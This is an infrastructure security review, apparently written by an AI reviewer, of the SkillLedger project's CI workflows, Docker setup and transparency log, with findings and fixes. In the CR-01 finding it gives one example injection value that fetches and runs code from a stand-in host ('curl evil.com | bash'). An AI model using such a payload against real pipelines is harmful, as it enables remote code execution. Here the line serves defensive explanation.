---
reviewed: 2026-05-07T12:00:00Z
depth: deep
scope: infrastructure, hooks, CI/CD, transparency log, deployment, dashboard, threat-library
files_reviewed: 42
files_reviewed_list:
  - hooks/claude-code-hook.sh
  - hooks/generic-hook.sh
  - hooks/install.sh
  - hooks/mcp-hook.sh
  - hooks/npm-hook.sh
  - hooks/openclaw-hook.sh
  - .github/actions/build/action.yml
  - .github/actions/sign/action.yml
  - .github/actions/verify/action.yml
  - .github/workflows/skillledger-ci.yml
  - .github/workflows/release.yml
  - .github/workflows/validate-threat-library.yml
  - .github/workflows/ingest-threat-library.yml
  - .github/CODEOWNERS
  - docker-compose.yml
  - docker-compose.prod.yml
  - Caddyfile.prod
  - log/cmd/skillledger-log/main.go
  - log/internal/personality/personality.go
  - log/internal/personality/entry.go
  - log/internal/personality/personality_test.go
  - log/internal/logclient/client.go
  - log/internal/logclient/proof.go
  - log/internal/logclient/client_test.go
  - log/Dockerfile
  - log/go.mod
  - log/railway.json
  - spec/schemas/core.schema.json
  - spec/schemas/capabilities.schema.json
  - spec/schemas/profiles/claude-code-skill.schema.json
  - spec/schemas/profiles/mcp-server.schema.json
  - spec/examples/claude-code-skill.skillledger.yaml
  - threat-library/ioc/hashes.json
  - threat-library/ioc/domains.json
  - threat-library/schema/ioc-hash.schema.json
  - threat-library/schema/ioc-domain.schema.json
  - dashboard/src/lib/api.ts
  - dashboard/src/lib/api-client.ts
  - dashboard/src/lib/api-server.ts
  - dashboard/src/app/api/health/route.ts
  - dashboard/Dockerfile
  - dashboard/.env.local.example
findings:
  critical: 5
  warning: 8
  info: 4
  total: 17
status: issues_found
---

# Infrastructure Code Review Report

**Reviewed:** 2026-05-07
**Depth:** deep (cross-file, cross-component)
**Files Reviewed:** 42
**Status:** issues_found

## Summary

This review covers the infrastructure layer of SkillLedger: shell hooks, CI/CD workflows, Docker deployment, the Tessera-based transparency log, JSON schemas, the Next.js dashboard scaffold, and the threat library. The codebase demonstrates solid architectural choices (Tessera over Trillian, fail-closed hooks, POSIX storage, proper health checks). However, there are several security issues that must be addressed before production use, primarily around GitHub Actions injection vulnerabilities, insecure default credentials in Docker Compose, an unauthenticated transparency log write endpoint, and a container running as root.

## Critical Issues

### CR-01: GitHub Actions script injection via unsanitized inputs

**File:** `.github/actions/build/action.yml:28`, `.github/actions/build/action.yml:54`, `.github/actions/verify/action.yml:37-38`
**Issue:** Multiple composite actions interpolate `${{ inputs.* }}` directly into `run:` shell blocks. An attacker who controls the workflow input (e.g., via a forked PR with a crafted `skill-dir` value like `"; curl evil.com | bash; echo "`) can inject arbitrary shell commands.

Lines affected:
- `action.yml` (build): `VERSION="${{ inputs.version }}"` (line 28) -- attacker-controlled version string
- `action.yml` (build): `cd "${{ inputs.skill-dir }}"` (line 54) -- path traversal and injection
- `action.yml` (verify): `--preset "${{ inputs.policy-preset }}" --service-url "${{ inputs.service-url }}"` (line 37) -- attacker-controlled URL/preset

**Fix:** Use environment variables instead of direct interpolation:
```yaml
- name: Build artifact
  id: build
  shell: bash
  env:
    SKILL_DIR: ${{ inputs.skill-dir }}
  run: |
    set -euo pipefail
    cd "$SKILL_DIR"
    skillledger build
    # ...
```
This is the standard GitHub Actions mitigation documented in GitHub's security hardening guide.

### CR-02: Transparency log POST /add endpoint has no authentication

**File:** `log/cmd/skillledger-log/main.go:61`, `log/internal/personality/personality.go:117`
**Issue:** The `POST /add` endpoint accepts entries from any caller with no authentication, authorization, or rate limiting. Any network-reachable client can flood the log with arbitrary entries. For a security-critical transparency log, this means an attacker can:
1. Pollute the log with fake entries, undermining its trust value
2. DoS the log by saturating the pushback limit (4096 entries)

The pushback mechanism (line 157) provides backpressure but not access control.

**Fix:** Add authentication middleware (e.g., Bearer token check) to `POST /add`:
```go
mux.HandleFunc("POST /add", authMiddleware(p.HandleAdd))
```
Where `authMiddleware` validates a shared secret or API key from the `Authorization` header. The service layer already has auth -- the log personality should too, or it should only be reachable from the service (not exposed on 0.0.0.0).

### CR-03: Default admin API key and JWT secret in docker-compose.yml

**File:** `docker-compose.yml:30-31`
**Issue:** The dev compose file sets hardcoded fallback secrets:
```yaml
SKILLLEDGER_ADMIN_API_KEY=${SKILLLEDGER_ADMIN_API_KEY:-dev-admin-key-do-not-use-in-prod}
SKILLLEDGER_JWT_SECRET=${SKILLLEDGER_JWT_SECRET:-dev-jwt-secret-do-not-use-in-prod}
```
While these have warning names, `docker-compose.yml` is the base file used by both dev AND prod overlays. If someone runs the base file without setting env vars (common in staging/demo), they get a known admin key and JWT secret. The prod overlay (line 35-36) correctly uses `${VAR:?error}` syntax, but the base file silently accepts insecure defaults.

Additionally, `AUTH_SECRET=${AUTH_SECRET:-dev-secret-change-in-prod}` (line 63) has the same issue for the dashboard.

**Fix:** Use `${SKILLLEDGER_ADMIN_API_KEY:?SKILLLEDGER_ADMIN_API_KEY must be set}` even in the base compose file, or generate a random default at runtime. At minimum, add a startup check that rejects known dev keys.

### CR-04: Log container runs as root

**File:** `log/Dockerfile:17-30`
**Issue:** The runtime stage does not create or switch to a non-root user. The `skillledger-log` binary runs as root inside the container, which violates the principle of least privilege. If the binary has a vulnerability (e.g., path traversal via tile serving on line 65 of main.go), an attacker gains root access to the container.

Compare with the dashboard Dockerfile which correctly creates and uses a `nextjs` user (lines 20-21, 27).

**Fix:**
```dockerfile
RUN addgroup -S loguser && adduser -S loguser -G loguser
RUN chown -R loguser:loguser /data/tlog
USER loguser
```

### CR-05: CI workflow leaks API key on command line

**File:** `.github/workflows/skillledger-ci.yml:71`
**Issue:** The publish step passes the API key as a command-line argument:
```yaml
--api-key "${{ secrets.SKILLLEDGER_API_KEY }}"
```
Command-line arguments are visible in `/proc/<pid>/cmdline` and may appear in CI logs if debug logging is enabled. GitHub masks secrets in logs, but this masking is best-effort and does not cover all edge cases (e.g., secrets that appear as substrings, multi-line values).

**Fix:** Pass the API key via environment variable instead:
```yaml
env:
  SKILLLEDGER_API_KEY: ${{ secrets.SKILLLEDGER_API_KEY }}
run: |
  skillledger publish \
    --artifact "$ARTIFACT_PATH" \
    --service-url "$SERVICE_URL"
```
And have the CLI read `SKILLLEDGER_API_KEY` from the environment (which it likely already supports via Viper).

## Warnings

### WR-01: Transparency log serves storage directory as static files

**File:** `log/cmd/skillledger-log/main.go:65-68`
**Issue:** `http.FileServer(http.Dir(p.StoragePath()))` serves the entire storage directory. While routes are limited to `/checkpoint`, `/tile/`, and `/entries/`, the `http.FileServer` will follow the path after the prefix. If Tessera writes any non-tile files to the storage directory (e.g., lock files, temp files), they become world-readable. Additionally, `http.Dir` does not prevent directory listing.

**Fix:** Use `http.StripPrefix` with specific path prefixes and consider wrapping with a handler that disallows directory listing:
```go
mux.Handle("GET /tile/", http.StripPrefix("/", http.FileServer(http.Dir(p.StoragePath()))))
```
Or serve only known tile patterns via a custom handler.

### WR-02: LogEntry validation does not validate content_address hash portion

**File:** `log/internal/personality/entry.go:36-38`
**Issue:** Validation checks that `content_address` starts with `"sha256-"` but does not validate that the remainder is a valid 64-character hex hash. An entry with `content_address: "sha256-garbage"` passes validation and gets logged. This also means `sha256` and `content_address` can contain inconsistent hash values.

**Fix:**
```go
if !strings.HasPrefix(entry.ContentAddress, "sha256-") {
    return fmt.Errorf("content_address must start with \"sha256-\", got %q", entry.ContentAddress)
}
hashPart := strings.TrimPrefix(entry.ContentAddress, "sha256-")
if !sha256Regex.MatchString(hashPart) {
    return fmt.Errorf("content_address hash portion must be 64 lowercase hex chars, got %q", hashPart)
}
```

### WR-03: LogEntry validation does not validate published_at format or publisher field

**File:** `log/internal/personality/entry.go:39-42`
**Issue:** `published_at` is only checked for emptiness. Any non-empty string passes, including "yesterday" or "abc". For a transparency log that records publication timestamps, malformed dates undermine auditability. Additionally, the `publisher` field is not validated at all (can be empty).

**Fix:**
```go
if _, err := time.Parse(time.RFC3339, entry.PublishedAt); err != nil {
    return fmt.Errorf("published_at must be RFC3339 format: %w", err)
}
if entry.Publisher == "" {
    return fmt.Errorf("publisher is required")
}
```

### WR-04: Release workflow uses unpinned third-party action

**File:** `.github/workflows/release.yml:68`
**Issue:** `softprops/action-gh-release@v2` is pinned to a major version tag, not a commit SHA. This is a supply-chain risk -- if the third-party action's `v2` tag is compromised (tag force-push), all releases of SkillLedger would execute attacker code with `contents: write` permission.

For a supply-chain security tool, this is particularly ironic and damaging to credibility.

**Fix:** Pin to a specific commit SHA:
```yaml
uses: softprops/action-gh-release@de2c0eb89ae2a093876385921b02d7d404c0ce44  # v2.0.9
```

### WR-05: Smoke test in release workflow uses npx with unsanitized version interpolation

**File:** `.github/workflows/release.yml:89`
**Issue:** `npx skillledger@${{ env.VERSION }}` uses interpolation in a shell context. While `VERSION` is derived from a validated tag, `npx` will download and execute arbitrary code from npm. If the npm publish step (line 79) fails silently, this smoke test would either fail confusingly or (worse) download a different version.

**Fix:** Add explicit failure check after the publish step and use `--yes` flag:
```yaml
npx --yes "skillledger@${VERSION}" --version || {
  echo "::error::Smoke test failed"
  exit 1
}
```

### WR-06: Docker Compose exposes services on 0.0.0.0 in dev mode

**File:** `docker-compose.yml:6-7`, `docker-compose.yml:26-27`
**Issue:** In the base compose file, `skillledger-log` binds to `0.0.0.0:2025` and `skillledger-service` binds to `0.0.0.0:8000`. While postgres correctly binds to `127.0.0.1:5432`, the other services are network-accessible. Combined with CR-02 (no auth on log) and CR-03 (default admin key), this means anyone on the local network can write to the log and administer the service.

The prod overlay correctly overrides to `127.0.0.1`, but the base file is dangerous.

**Fix:** Bind all services to `127.0.0.1` in the base compose:
```yaml
ports:
  - "127.0.0.1:2025:2025"
  - "127.0.0.1:8000:8000"
```

### WR-07: Caddyfile.prod missing Content-Security-Policy and other hardening headers

**File:** `Caddyfile.prod:1-25`
**Issue:** The Caddy config sets good security headers (HSTS, X-Content-Type-Options, X-Frame-Options) but is missing:
1. `Content-Security-Policy` -- critical for the dashboard to prevent XSS
2. `Referrer-Policy` -- prevents leaking URLs to third parties
3. Rate limiting on the API reverse proxy
4. `Permissions-Policy` -- restricts browser features

The `SKILLLEDGER_CORS_ORIGINS` env var is set in docker-compose.prod.yml but CORS is handled at the application level, not Caddy -- if the app has a CORS bug, there is no defense-in-depth.

**Fix:** Add at minimum:
```
header {
    Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    Referrer-Policy "strict-origin-when-cross-origin"
    Permissions-Policy "camera=(), microphone=(), geolocation=()"
}
```

### WR-08: Ingest workflow inline Python has no error handling for missing secrets

**File:** `.github/workflows/ingest-threat-library.yml:29-54`
**Issue:** The inline Python script uses `os.environ['SKILLLEDGER_SERVICE_URL']` and `os.environ['SKILLLEDGER_ADMIN_KEY']` which will throw `KeyError` with a stack trace if secrets are not configured. This produces an unhelpful CI failure. Also, `urllib.request.urlopen` does not check the response status for errors -- the code prints the response body but always exits 0 regardless of HTTP status.

**Fix:** Add explicit checks and error handling:
```python
url = os.environ.get('SKILLLEDGER_SERVICE_URL')
key = os.environ.get('SKILLLEDGER_ADMIN_KEY')
if not url or not key:
    print('ERROR: SKILLLEDGER_SERVICE_URL and SKILLLEDGER_ADMIN_KEY secrets must be set')
    sys.exit(1)
# ...
if resp.status >= 400:
    print(f'ERROR: Ingestion failed ({resp.status}): {resp.read().decode()}')
    sys.exit(1)
```

## Info

### IN-01: Hook scripts are nearly identical -- high code duplication

**File:** `hooks/claude-code-hook.sh`, `hooks/mcp-hook.sh`, `hooks/npm-hook.sh`, `hooks/openclaw-hook.sh`
**Issue:** All four ecosystem hooks are functionally identical (same argument parsing, same env var handling, same `skillledger verify` invocation). Only `generic-hook.sh` adds status messages. This is 4x code duplication that increases maintenance burden.

**Fix:** Have ecosystem hooks source or delegate to `generic-hook.sh`:
```bash
#!/usr/bin/env bash
exec "$(dirname "$0")/generic-hook.sh" "$@"
```

### IN-02: SerializeEntry claims determinism but does not use canonical JSON

**File:** `log/internal/personality/entry.go:47-48`
**Issue:** The comment says "Go struct field order is deterministic (declaration order)" which is true for `encoding/json`, but this is an implementation detail not guaranteed by the language spec. The project has a `cli/internal/canon/` package for JCS canonical JSON, but the log personality does not use it. For a Merkle tree where leaf content affects proof correctness, this could cause subtle issues if the serialization format ever changes.

**Fix:** Consider using the existing JCS canonicalization or document the reliance on Go's `encoding/json` struct field ordering as an explicit design decision.

### IN-03: testVerifier uses nil rand reader

**File:** `log/internal/logclient/client_test.go:18`
**Issue:** `note.GenerateKey(nil, "test-log")` passes `nil` as the random reader. While this may work if the implementation falls back to `crypto/rand.Reader`, it is fragile and inconsistent with the personality test which correctly uses `crypto/rand.Reader` (personality_test.go:132).

**Fix:** `note.GenerateKey(crypto_rand.Reader, "test-log")`

### IN-04: threat-library/ioc/hashes.json is empty

**File:** `threat-library/ioc/hashes.json`
**Issue:** The file contains only `[]`. While the domains.json has 18 entries, the hash IOC database has zero entries. The schema and validation pipeline exist but there is no hash IOC data to validate or ingest.

**Fix:** Add initial hash IOC entries, or add a comment/README note explaining that hash IOCs come from a different source.

---

## Strengths

1. **Fail-closed hooks**: All hook scripts use `set -euo pipefail` (all 6 files) and exit non-zero on any failure. This is exactly right for a security gate.

2. **Health checks**: Both Docker Compose services and the log Dockerfile have proper health checks with appropriate intervals and timeouts (`docker-compose.yml:14-19`, `log/Dockerfile:28`).

3. **Prod overlay pattern**: The `docker-compose.prod.yml` correctly overrides ports to `127.0.0.1`, requires secrets via `${VAR:?error}`, and adds Caddy TLS. This is a clean separation of dev/prod concerns.

4. **Tessera integration**: The transparency log correctly uses Tessera v1.0.2 (not Trillian), with proper proof building, checkpoint verification, and consistency checks. The `proof.go` implementation correctly uses RFC 6962 leaf hashing and verifies checkpoint signatures before trusting tree state (`log/internal/logclient/proof.go:31-57`).

5. **Entry size limits**: `HandleAdd` limits request bodies to 16KB (`personality.go:118-128`), preventing memory exhaustion attacks.

6. **Graceful shutdown**: The log binary handles SIGINT/SIGTERM with a 30-second timeout for draining in-flight requests (`log/cmd/skillledger-log/main.go:92-108`).

7. **Dashboard Dockerfile**: Proper multi-stage build with non-root user, standalone output mode, and minimal final image (`dashboard/Dockerfile:20-21,27`).

8. **Schema design**: Core schema uses `unevaluatedProperties: false` and conditional profile validation via `allOf/if/then`, which is the correct JSON Schema 2020-12 pattern (`spec/schemas/core.schema.json:47-81`).

9. **HTTP server timeouts**: The log server sets `ReadTimeout`, `WriteTimeout`, and `IdleTimeout` (`log/cmd/skillledger-log/main.go:71-77`), preventing slowloris and connection exhaustion attacks.

10. **Workflow permissions**: The CI workflow correctly scopes permissions to minimum needed (`skillledger-ci.yml:37-39`): `id-token: write` for Sigstore, `contents: read` only.

## Assessment

**Infrastructure quality:** 7/10
Good architectural choices and clean separation of concerns. The hook duplication and missing canonical JSON in the log are minor negatives. Docker and CI configurations are well-structured.

**Security posture:** 5/10
The GitHub Actions injection vulnerabilities (CR-01), unauthenticated log endpoint (CR-02), default credentials (CR-03), and root container (CR-04) are serious gaps for a supply-chain security tool. The project correctly implements cryptographic verification (proofs, checkpoint signing) but has gaps in the surrounding infrastructure layer.

**Production readiness:** 5/10
The prod overlay addresses some concerns (TLS, bound ports, required secrets) but the base compose file's insecure defaults, lack of log authentication, unpinned CI actions, and missing CSP headers mean additional hardening is needed before production deployment.

---

_Reviewed: 2026-05-07_
_Reviewer: Claude (infrastructure code reviewer)_
_Depth: deep_
